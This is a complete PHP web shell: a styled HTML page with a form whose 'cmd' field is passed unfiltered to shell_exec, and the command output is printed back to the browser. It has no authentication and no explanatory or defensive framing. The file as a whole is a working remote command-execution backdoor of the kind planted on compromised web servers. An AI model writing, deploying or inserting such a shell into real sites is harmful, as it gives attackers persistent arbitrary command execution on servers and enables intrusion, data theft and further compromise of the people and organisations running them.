<?php
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Shell</title>
    <style>
        body {
            background-color: #1d1f21;
            color: #c5c8c6;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        h1 {
            color: #81a2be;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            border: 2px solid #373b41;
            background-color: #282a2e;
            color: #c5c8c6;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #81a2be;
            border: none;
            color: #fff;
            cursor: pointer;
        }
        pre {
            text-align: left;
            padding: 10px;
            background-color: #373b41;
            border: 1px solid #c5c8c6;
            overflow-x: auto;
            max-width: 90%;
            margin: 20px auto;
        }
    </style>
</head>
<body>
    <h1>PHP Web Shell</h1>
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter your command here" autocomplete="off">
        <input type="submit" value="Execute">
    </form>
</body>
</html>

